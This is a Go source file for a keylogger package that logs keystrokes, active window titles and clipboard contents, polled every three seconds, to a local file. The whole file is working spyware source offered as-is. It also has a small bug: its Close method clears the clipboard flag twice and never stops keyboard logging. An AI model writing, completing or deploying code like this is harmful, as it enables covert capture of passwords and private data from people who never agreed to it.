package keylogger

import (
	"fmt"
	"os"
	"path/filepath"
	"time"

	"github.com/atotto/clipboard"
)

type Keylogger struct {
	file                                  *os.File
	isKeyboardLogging, isClipboardLogging bool
}

func NewKeylogger(name string, keyboard, clipboard bool) (*Keylogger, error) {
	path, err := filepath.Abs(name)
	if err != nil {
		return nil, err
	}
	file, err := os.Create(path)
	if err != nil {
		return nil, err
	}
	return &Keylogger{file, keyboard, clipboard}, nil
}

func (l *Keylogger) RunKeyboardLogger() {
	if !l.isKeyboardLogging {
		return
	}
	data := make(chan string, 500)
	go WindowLogger(data)
	go KeyLogger(data)
	for l.isKeyboardLogging {
		text := <-data
		if text == "" {
			continue
		}
		if _, err := l.file.Write([]byte(text)); err != nil {
			fmt.Println(err)
		}
	}
}

func (l *Keylogger) RunClipboardLogger() {
	if !l.isClipboardLogging {
		return
	}
	tmp := ""
	for l.isClipboardLogging {
		text, _ := clipboard.ReadAll()
		if text != tmp {
			if _, err := l.file.Write([]byte(fmt.Sprintf("\nClipboard[%s]\n", text))); err != nil {
				fmt.Println(err)
			}
			tmp = text
		}
		time.Sleep(3 * time.Second)
	}
}

func (l *Keylogger) Close() {
	l.isClipboardLogging = false
	l.isClipboardLogging = false
	_ = l.file.Close()
}
